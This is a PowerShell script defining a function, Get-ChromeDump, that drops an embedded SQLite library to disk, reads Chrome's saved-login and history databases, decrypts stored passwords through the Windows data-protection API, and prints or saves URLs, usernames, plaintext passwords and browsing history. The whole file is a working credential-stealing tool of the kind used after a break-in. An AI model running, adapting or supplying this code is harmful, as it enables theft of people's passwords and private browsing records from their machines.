Function Get-ChromeDump{
  [CmdletBinding()]
  param(
    [Parameter(Mandatory = $False)]
    [string]$OutFile
  )
    Add-Type -Assembly System.Security if(([System.Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem){
      Write-Warning "Unable to decrypt passwords contained in Login Data file as SYSTEM."
      $NoPasswords = $True
    }
    if([IntPtr]::Size -eq 8)
    {
      $assembly = "TVqQAAAA...AAAAAA=="  # The omitted "TVqQAAAA...AAAAAA==" is actually a 2521,191 character long Base64 string.
    }
    else
    {
      $assembly = "TVqQAAAA...AAAAAA=="  # The omitted "TVqQAAAA...AAAAAA==" is actually a 2521,772 character long Base64 string.
    }
    Write-Verbose "[+]System.Data.SQLite.dll will be written to disk"
    $content = [System.Convert]::FromBase64String($assembly) 
    $assemblyPath = "$($env:LOCALAPPDATA)\System.Data.SQLite.dll" 
    if(Test-path $assemblyPath)
    {
      try 
      {
        Add-Type -Path $assemblyPath
      }
      catch 
      {
        Write-Warning "Unable to load SQLite assembly"
        break
      }
    }
    else
    {
        [System.IO.File]::WriteAllBytes($assemblyPath,$content)
        Write-Verbose "[+]Assembly for SQLite written to $assemblyPath"
        try 
        {
            Add-Type -Path $assemblyPath
        }
        catch 
        {
            Write-Warning "Unable to load SQLite assembly"
            break
        }
    }
    if(Get-Process | Where-Object {$_.Name -like "*chrome*"}){
      Write-Warning "[+]Cannot parse Data files while chrome is running"
      break
    }
    $OS = [environment]::OSVersion.Version
    if($OS.Major -ge 6){
      $chromepath = "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Default"
    }
    else{
      $chromepath = "$($env:HOMEDRIVE)\$($env:HOMEPATH)\Local Settings\Application Data\Google\Chrome\User Data\Default"
    }
    if(!(Test-path $chromepath)){
      Throw "Chrome user data directory does not exist"
    }
    else{
      if(Test-Path -Path "$chromepath\Web Data"){$WebDatadb = "$chromepath\Web Data"}
      if(Test-Path -Path "$chromepath\Login Data"){$loginDatadb = "$chromepath\Login Data"}
      if(Test-Path -Path "$chromepath\History"){$historydb = "$chromepath\History"}
    }
    if(!($NoPasswords)){ 
      $connStr = "Data Source=$loginDatadb; Read Only=True; Version=3;"
      $connection = New-Object System.Data.SQLite.SQLiteConnection($connStr)
      $OpenConnection = $connection.OpenAndReturn()
      Write-Verbose "Opened DB file $loginDatadb"
      $query = "SELECT * FROM logins;"
      $dataset = New-Object System.Data.DataSet
      $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$OpenConnection)
      [void]$dataAdapter.fill($dataset)
      $logins = @()
      Write-Verbose "Parsing results of query $query"
      $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
        $encryptedBytes = $_.password_value
        $username = $_.username_value
        $url = $_.action_url
        $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
        $plaintext = [System.Text.Encoding]::ASCII.GetString($decryptedBytes)
        $login = New-Object PSObject -Property @{
          URL = $url
          PWD = $plaintext
          User = $username 
        }
        $logins += $login
      }
    }
    $connString = "Data Source=$historydb; Version=3;"
    $connection = New-Object System.Data.SQLite.SQLiteConnection($connString)
    $Open = $connection.OpenAndReturn()
    Write-Verbose "Opened DB file $historydb"
    $DataSet = New-Object System.Data.DataSet
    $query = "SELECT * FROM urls;"
    $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$Open)
    [void]$dataAdapter.fill($DataSet)
    $History = @()
    $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
      $HistoryInfo = New-Object PSObject -Property @{
        Title = $_.title 
        URL = $_.url
      }
      $History += $HistoryInfo
    }
    if(!($OutFile)){
      "[*]CHROME PASSWORDS`n"
      $logins | Format-Table URL,User,PWD -AutoSize
      "[*]CHROME HISTORY`n"
      $History | Format-List Title,URL 
    }
    else {
        "[*]LOGINS`n" | Out-File $OutFile 
        $logins | Out-File $OutFile -Append
        "[*]HISTORY`n" | Out-File $OutFile -Append
        $History | Out-File $OutFile -Append  
    }
    Write-Warning "[!] Please remove SQLite assembly from here: $assemblyPath"
}
